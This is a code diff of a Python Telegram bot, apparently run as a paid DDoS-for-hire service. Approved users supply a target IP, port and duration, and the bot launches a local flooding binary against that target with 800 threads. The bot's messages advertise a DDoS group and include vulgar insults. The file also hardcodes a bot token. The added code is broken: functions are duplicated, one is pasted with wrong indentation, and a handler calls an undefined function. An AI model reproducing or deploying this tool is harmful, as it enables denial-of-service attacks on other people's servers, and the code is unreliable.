@@ -1,205 +1,397 @@
-import subprocess
-import json
-import os
-import random
-import string
+import asyncio
 import datetime
 from telegram import Update
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
-from rajaji import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
-from telegram import ReplyKeyboardMarkup, KeyboardButton
-USER_FILE = "users.json"
-KEY_FILE = "keys.json"
-flooding_process = None
-flooding_command = None
-DEFAULT_THREADS = 800
-users = {}
-keys = {}
+from telegram.ext import Application, CommandHandler, CallbackContext
 
-def load_data():
-    global users, keys
-    users = load_users()
-    keys = load_keys()
+TELEGRAM_BOT_TOKEN = '8050966708:AAGRof2DsChsr2VWdXnqn7sTkrq6H5Wan9U'
+ADMIN_USER_ID = -1002374071862
+USERS_FILE = 'users.txt'
+LOG_FILE = 'log.txt'
+attack_in_progress = False
+users = set()
+user_approval_expiry = {}
+
 
 def load_users():
     try:
-        with open(USER_FILE, "r") as file:
-            return json.load(file)
+        with open(USERS_FILE) as f:
+            return set(line.strip() for line in f)
     except FileNotFoundError:
-        return {}
-    except Exception as e:
-        print(f"Error loading users: {e}")
-        return {}
+        return set()
 
-def save_users():
-    with open(USER_FILE, "w") as file:
-        json.dump(users, file)
 
-def load_keys():
+def save_users(users):
+    with open(USERS_FILE, 'w') as f:
+        f.writelines(f"{user}\n" for user in users)
+
+
+def log_command(user_id, target, port, duration):
+    with open(LOG_FILE, 'a') as f:
+        f.write(f"UserID: {user_id} | Target: {target} | Port: {port} | Duration: {duration} | Timestamp: {datetime.datetime.now()}\n")
+
+
+def clear_logs():
     try:
-        with open(KEY_FILE, "r") as file:
-            return json.load(file)
-    except FileNotFoundError:
-        return {}
-    except Exception as e:
-        print(f"Error loading keys: {e}")
-        return {}
-
-def save_keys():
-    with open(KEY_FILE, "w") as file:
-        json.dump(keys, file)
-
-def generate_key(length=6):
-    characters = string.ascii_letters + string.digits
-    return ''.join(random.choice(characters) for _ in range(length))
-
-def add_time_to_current_date(hours=0, days=0):
-    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
-    
-async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = str(update.message.from_user.id)
-    if user_id in ADMIN_IDS:
-        command = context.args
-        if len(command) == 2:
-            try:
-                time_amount = int(command[0])
-                time_unit = command[1].lower()
-                if time_unit == 'hours':
-                    expiration_date = add_time_to_current_date(hours=time_amount)
-                elif time_unit == 'days':
-                    expiration_date = add_time_to_current_date(days=time_amount)
-                else:
-                    raise ValueError("Invalid time unit")
-                key = generate_key()
-                keys[key] = expiration_date
-                save_keys()
-                response = f"🔑 𝙂𝙀𝙉𝙆𝙀𝙔\n {key}\n⏳ 𝙑𝘼𝙇𝙄𝘿𝙄𝙏𝙔\n {expiration_date}\n\n𝙀𝙉𝙏𝙀𝙍 𝙆𝙀𝙔 𝘽𝙊𝙏 𝙇𝙄𝙆𝙀 --> \n/redeem"
-            except ValueError:
-                response = f"𝙐𝙨𝙖𝙜𝙚-> /𝙜𝙚𝙣𝙠𝙚𝙮 30 𝙙𝙖𝙮𝙨"
-        else:
-            response = "𝙐𝙨𝙖𝙜𝙚-> /𝙜𝙚𝙣𝙠𝙚𝙮 30 𝙙𝙖𝙮𝙨"
-    else:
-        response = f"𝙊𝙉𝙇𝙔 𝙊𝙒𝙉𝙀𝙍 𝘾𝘼𝙉 𝙐𝙎𝙀❌𝙊𝙒𝙉𝙀𝙍 𝙊𝙒𝙉𝙀𝙍-> @rajaraj_04"
-
-    await update.message.reply_text(response)
-
-async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = str(update.message.from_user.id)
-    command = context.args
-    if len(command) == 1:
-        key = command[0]
-        if key in keys:
-            expiration_date = keys[key]
-            if user_id in users:
-                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
-                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
-                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
+        with open(LOG_FILE, 'r+') as f:
+            if f.read().strip():
+                f.truncate(0)
+                return "*✅ Logs cleared successfully.*"
             else:
-                users[user_id] = expiration_date
-            save_users()
-            del keys[key]
-            save_keys()
-            response = f"🔑 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇 𝙆𝙀𝙔 𝙍𝙀𝘿𝙀𝙀𝙈"
-        else:
-            response = f"✅𝙊𝙒𝙉𝙀𝙍- @rajaraj_04"
+                return "*⚠️ No logs found.*"
+    except FileNotFoundError:
+        return "*⚠️ No logs file found.*"
+
+
+def set_approval_expiry_date(user_id, duration, time_unit):
+    current_time = datetime.datetime.now()
+    if time_unit in ["hour", "hours"]:
+        expiry_date = current_time + datetime.timedelta(hours=duration)
+    elif time_unit in ["day", "days"]:
+        expiry_date = current_time + datetime.timedelta(days=duration)
+    elif time_unit in ["week", "weeks"]:
+        expiry_date = current_time + datetime.timedelta(weeks=duration)
+    elif time_unit in ["month", "months"]:
+        expiry_date = current_time + datetime.timedelta(days=30 * duration)
     else:
-        response = f"𝙐𝙨𝙖𝙜𝙚-> /𝙧𝙚𝙙𝙚𝙚𝙢"
-
-    await update.message.reply_text(response)
-
-
-async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    global flooding_command
-    user_id = str(update.message.from_user.id)
-
-    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("🔑 𝙉𝙊 𝘼𝙋𝙋𝙍𝙊𝙑𝘼𝙇 𝘽𝙀𝙔 𝙏𝙊 𝘿𝙈-> @rajaraj_04")
-        return
-
-    if len(context.args) != 3:
-        await update.message.reply_text('🚀 𝙐𝙨𝙖𝙜𝙚->  /𝘽𝙂𝙈𝙄 𝙄𝙋 𝙋𝙊𝙍𝙏 𝙏𝙄𝙈𝙀')
-        return
-
-    target_ip = context.args[0]
-    port = context.args[1]
-    duration = context.args[2]
-
-    flooding_command = ['./raja', target_ip, port, duration, str(DEFAULT_THREADS)]
-    await update.message.reply_text(f'🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙋𝙀𝙉𝘿𝙄𝙉𝙂 🚀\n\n💣𝙃𝙊𝙎𝙏-> {target_ip}\n💣𝙋𝙊𝙍𝙏-> {port} \n💣𝙏𝙄𝙈𝙀-> {duration}\n\n🇮🇳  𝙑𝙄𝙋 𝘿𝘿𝙊𝙎')
+        return False
+    user_approval_expiry[user_id] = expiry_date
+    return True
 
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    global flooding_process, flooding_command
-    user_id = str(update.message.from_user.id)
-
-    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝙀𝙉𝙏-> /raja\n\n✅𝙊𝙒𝙉𝙀𝙍- @rajaraj_04")
-        return
-
-    if flooding_process is not None:
-        await update.message.reply_text('🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙋𝙀𝙉𝘿𝙄𝙉𝙂->\n\n𝙏𝙊𝙋 𝙏𝙊 𝙎𝙏𝙊𝙋-> /stop')
-        return
-
-    if flooding_command is None:
-        await update.message.reply_text('𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝙀𝙉𝙏-> /raja\n\n✅𝙊𝙒𝙉𝙀𝙍- @rajaraj_04')
-        return
-
-    flooding_process = subprocess.Popen(flooding_command)
-    await update.message.reply_text('🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏 🚀\n🥇𝙋𝙍𝙄𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍🥇\n𝙁𝘿𝘽𝙆-> @rajaraj_04\n\n🇮🇳  𝙑𝙄𝙋 𝘿𝘿𝙊𝙎')
+def get_remaining_approval_time(user_id):
+    expiry_date = user_approval_expiry.get(user_id)
+    if expiry_date:
+        remaining_time = expiry_date - datetime.datetime.now()
+        return str(remaining_time) if remaining_time.total_seconds() > 0 else "Expired"
+    return "N/A"
 
 
-async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    global flooding_process
-    user_id = str(update.message.from_user.id)
-
-    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝙀𝙉𝙏-> /raja\n\n✅𝙊𝙒𝙉𝙀𝙍- @rajaraj_04")
-        return
-
-    if flooding_process is None:
-        await update.message.reply_text('❌ 𝙀𝙍𝙍𝙊𝙍 ❌')
-        return
-
-    flooding_process.terminate()
-    flooding_process = None
-    await update.message.reply_text('🛑 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋 🛑\n\n𝙏𝙊𝙋 𝙏𝙊 𝙎𝙏𝘼𝙍𝙏-> /start')
-    
-    await update.message.reply_text(response)
-
-# Update the raja_command function to include buttons
-async def raja_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    # Create buttons
-    markup = ReplyKeyboardMarkup(
-        [
-            [KeyboardButton("/bgmi"), KeyboardButton("/start")],
-            [KeyboardButton("/stop")]
-        ],
-        resize_keyboard=False
+async def start(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    message = (
+        "*😈RAJA FREE DDOS GROUP 😈*\n\n"
+        "*Use /attack <ip> <port> <duration>*\n"
+        "* DM TO BUY :- @rajaraj_04 *"
     )
+    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+
+
+async def add_user(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    if chat_id != ADMIN_USER_ID:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You are not authorized to use this command.*", parse_mode='Markdown')
+        return
+
+    args = context.args
+    if len(args) < 2:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /add <user_id> <duration><time_unit>*\nExample: /add 12345 30days", parse_mode='Markdown')
+        return
+
+    user_to_add = args[0]
+    duration_str = args[1]
+
+    try:
+        duration = int(duration_str[:-4])
+        time_unit = duration_str[-4:].lower()
+        if set_approval_expiry_date(user_to_add, duration, time_unit):
+            users.add(user_to_add)
+            save_users(users)
+            expiry_date = user_approval_expiry[user_to_add]
+            response = f"*✔️ User {user_to_add} added successfully.*\nAccess expires on: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}."
+        else:
+            response = "*⚠️ Invalid time unit. Use 'hours', 'days', 'weeks', or 'months'.*"
+    except ValueError:
+        response = "*⚠️ Invalid duration format.*"
+
+    await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown')
+
+
+async def view_logs(update: Update, context: CallbackContext):
+    if update.effective_chat.id != ADMIN_USER_ID:
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Unauthorized access.*", parse_mode='Markdown')
+        return
+
+    try:
+        with open(LOG_FILE, 'r') as f:
+            logs = f.read().strip() or "*No logs available.*"
+    except FileNotFoundError:
+        logs = "*No logs available.*"
+
+    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*Logs:*\n\n{logs}", parse_mode='Markdown')
+
+
+async def clear_logs_command(update: Update, context: CallbackContext):
+    if update.effective_chat.id != ADMIN_USER_ID:
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️BHAK MADHARCOD 😡.*", parse_mode='Markdown')
+        return
+
+    response = clear_logs()
+    await context.bot.send_message(chat_id=update.effective_chat.id, text=response, parse_mode='Markdown')
+
+
+async def run_attack(chat_id, ip, port, duration, context):
+    global attack_in_progress
+    attack_in_progress = True
+
+    try:
+        command = f"./raja {ip} {port} {duration} 800"
+        process = await asyncio.create_subprocess_shell(
+            command,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await process.communicate()
+
+        if stdout:
+            print(f"[stdout]\n{stdout.decode()}")
+        if stderr:
+            print(f"[stderr]\n{stderr.decode()}")
+
+    except Exception as e:
+        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️kya kr rha h be: {str(e)}*", parse_mode='Markdown')
+
+    finally:
+        attack_in_progress = False
+        await context.bot.send_message(chat_id=chat_id, text="*✅ sever ki chudai khatam! ✅*\n*bgmi ko chodne ke liye dhanyawaad ✨✨🤗!*", parse_mode='Markdown')
+
+
+async def attack(update: Update, context: CallbackContext):
+    global attack_in_progress
+
+    chat_id = update.effective_chat.id
+    user_id = str(update.effective_user.id)
+    args = context.args
+
+    if user_id not in users or get_remaining_approval_time(user_id) == "Expired":
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ tere ko admin ki lode ki jarurat h approve kr le lode.*", parse_mode='Markdown')
+        return
+
+    if attack_in_progress:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ pahale se laga h lode wait kr.*", parse_mode='Markdown')
+        return
+
+    if len(args) != 3:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
+        return
+
+    ip, port, duration = args
+    try:
+        duration = int(duration)
+        if duration > 180:
+            response = "*⚠️ Error: Time interval must be less than or equal to 180 seconds.*"
+            await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown')
+            return
+    except ValueError:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Duration must be a valid number.*", parse_mode='Markdown')
+        return
+
+    log_command(user_id, ip, port, duration)
+
+    await context.bot.send_message(chat_id=chat_id, text=(
+        f"*⚔️ SEVER CHUD GYA! ⚔️*\n"
+        f"*🎯 Target: {ip}:{port}*\n"
+        f"*🕒 Duration: {duration} seconds*\n"
+        f"*🔥 Join :- https://t.me/+-DHMRIL1oQRlMjhl DDOS 💥*"
+    ), parse_mode='Markdown')
+
+    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
     
-    response = (
-        "🥇𝙋𝙍𝙄𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍🥇\n\n"
-        "/genkey-> 🔑 𝙂𝙀𝙉𝙆𝙀𝙔\n"
-        "/redeem-> 🔐 𝙍𝙀𝘿𝙀𝙀𝙈\n"
-        "/bgmi-> 🚀 𝘼𝙏𝙏𝘼𝘾𝙆\n"
-        "/start-> 🚀 𝙎𝙏𝘼𝙍𝙏 𝘼𝙏𝙏𝘼𝘾𝙆\n"
-        "/stop-> 🛑 𝙎𝙏𝙊𝙋 𝘼𝙏𝙏𝘼𝘾𝙆\n\n"
-        f"✅𝙊𝙒𝙉𝙀𝙍-> {OWNER_USERNAME}"
-    ) # Send message with the keyboard buttons
-    await update.message.reply_text(response, reply_markup=markup)
+    def load_users():
+    try:
+        with open(USERS_FILE) as f:
+            return set(line.strip() for line in f)
+    except FileNotFoundError:
+        return set()
 
-def main() -> None:
-    application = ApplicationBuilder().token(BOT_TOKEN).build()
 
-    application.add_handler(CommandHandler("genkey", genkey))
-    application.add_handler(CommandHandler("redeem", redeem))
-    application.add_handler(CommandHandler("bgmi", bgmi))
+def save_users(users):
+    with open(USERS_FILE, 'w') as f:
+        f.writelines(f"{user}\n" for user in users)
+
+
+def log_command(user_id, target, port, duration):
+    with open(LOG_FILE, 'a') as f:
+        f.write(f"UserID: {user_id} | Target: {target} | Port: {port} | Duration: {duration} | Timestamp: {datetime.datetime.now()}\n")
+
+
+def clear_logs():
+    try:
+        with open(LOG_FILE, 'r+') as f:
+            if f.read().strip():
+                f.truncate(0)
+                return "*✅ Logs cleared successfully.*"
+            else:
+                return "*⚠️ No logs found.*"
+    except FileNotFoundError:
+        return "*⚠️ No logs file found.*"
+
+
+def set_approval_expiry_date(user_id, duration, time_unit):
+    current_time = datetime.datetime.now()
+    if time_unit in ["hour", "hours"]:
+        expiry_date = current_time + datetime.timedelta(hours=duration)
+    elif time_unit in ["day", "days"]:
+        expiry_date = current_time + datetime.timedelta(days=duration)
+    elif time_unit in ["week", "weeks"]:
+        expiry_date = current_time + datetime.timedelta(weeks=duration)
+    elif time_unit in ["month", "months"]:
+        expiry_date = current_time + datetime.timedelta(days=30 * duration)
+    else:
+        return False
+    user_approval_expiry[user_id] = expiry_date
+    return True
+
+
+def get_remaining_approval_time(user_id):
+    expiry_date = user_approval_expiry.get(user_id)
+    if expiry_date:
+        remaining_time = expiry_date - datetime.datetime.now()
+        return str(remaining_time) if remaining_time.total_seconds() > 0 else "Expired"
+    return "N/A"
+
+
+async def start(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    message = (
+        "*😈RAJA FREE DDOS GROUP 😈*\n\n"
+        "*Use /attack1 <ip> <port> <duration>*\n"
+        "* DM TO BUY :- @rajaraj_04 *"
+    )
+    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+
+
+async def add_user(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    if chat_id != ADMIN_USER_ID:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You are not authorized to use this command.*", parse_mode='Markdown')
+        return
+
+    args = context.args
+    if len(args) < 2:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /add <user_id> <duration><time_unit>*\nExample: /add 12345 30days", parse_mode='Markdown')
+        return
+
+    user_to_add = args[0]
+    duration_str = args[1]
+
+    try:
+        duration = int(duration_str[:-4])
+        time_unit = duration_str[-4:].lower()
+        if set_approval_expiry_date(user_to_add, duration, time_unit):
+            users.add(user_to_add)
+            save_users(users)
+            expiry_date = user_approval_expiry[user_to_add]
+            response = f"*✔️ User {user_to_add} added successfully.*\nAccess expires on: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}."
+        else:
+            response = "*⚠️ Invalid time unit. Use 'hours', 'days', 'weeks', or 'months'.*"
+    except ValueError:
+        response = "*⚠️ Invalid duration format.*"
+
+    await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown')
+
+
+async def view_logs(update: Update, context: CallbackContext):
+    if update.effective_chat.id != ADMIN_USER_ID:
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Unauthorized access.*", parse_mode='Markdown')
+        return
+
+    try:
+        with open(LOG_FILE, 'r') as f:
+            logs = f.read().strip() or "*No logs available.*"
+    except FileNotFoundError:
+        logs = "*No logs available.*"
+
+    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*Logs:*\n\n{logs}", parse_mode='Markdown')
+
+
+async def clear_logs_command(update: Update, context: CallbackContext):
+    if update.effective_chat.id != ADMIN_USER_ID:
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️BHAK MADHARCOD 😡.*", parse_mode='Markdown')
+        return
+
+    response = clear_logs()
+    await context.bot.send_message(chat_id=update.effective_chat.id, text=response, parse_mode='Markdown')
+
+
+async def run_attack(chat_id, ip, port, duration, context):
+    global attack_in_progress
+    attack_in_progress = True
+
+    try:
+        command = f"./raj {ip} {port} {duration} 800"
+        process = await asyncio.create_subprocess_shell(
+            command,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await process.communicate()
+
+        if stdout:
+            print(f"[stdout]\n{stdout.decode()}")
+        if stderr:
+            print(f"[stderr]\n{stderr.decode()}")
+
+    except Exception as e:
+        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️kya kr rha h be: {str(e)}*", parse_mode='Markdown')
+
+    finally:
+        attack_in_progress = False
+        await context.bot.send_message(chat_id=chat_id, text="*✅ sever ki chudai khatam! ✅*\n*bgmi ko chodne ke liye dhanyawaad ✨✨🤗!*", parse_mode='Markdown')
+
+
+async def attack(update: Update, context: CallbackContext):
+    global attack_in_progress
+
+    chat_id = update.effective_chat.id
+    user_id = str(update.effective_user.id)
+    args = context.args
+
+    if user_id not in users or get_remaining_approval_time(user_id) == "Expired":
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ tere ko admin ki lode ki jarurat h approve kr le lode.*", parse_mode='Markdown')
+        return
+
+    if attack_in_progress:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ pahale se laga h lode wait kr.*", parse_mode='Markdown')
+        return
+
+    if len(args) != 3:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack1 <ip> <port> <duration>*", parse_mode='Markdown')
+        return
+
+    ip, port, duration = args
+    try:
+        duration = int(duration)
+        if duration > 200:
+            response = "*⚠️ Error: Time interval must be less than or equal to 200 seconds.*"
+            await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown')
+            return
+    except ValueError:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Duration must be a valid number.*", parse_mode='Markdown')
+        return
+
+    log_command(user_id, ip, port, duration)
+
+    await context.bot.send_message(chat_id=chat_id, text=(
+        f"*⚔️ SEVER2 CHUD GYA! ⚔️*\n"
+        f"*🎯 Target: {ip}:{port}*\n"
+        f"*🕒 Duration: {duration} seconds*\n"
+        f"*🔥 Join :- https://t.me/+-DHMRIL1oQRlMjhl DDOS 💥*"
+    ), parse_mode='Markdown')
+
+    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
+
+
+def main():
+    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("stop", stop))
-    application.add_handler(CommandHandler("raja", raja_command))
-
-    load_data()
+    application.add_handler(CommandHandler("add", add_user))
+    application.add_handler(CommandHandler("attack1", attack1))
+    application.add_handler(CommandHandler("viewlogs", view_logs))
+    application.add_handler(CommandHandler("clearlogs", clear_logs_command))
     application.run_polling()
 
+
 if __name__ == '__main__':
+    users = load_users()
     main()
+    
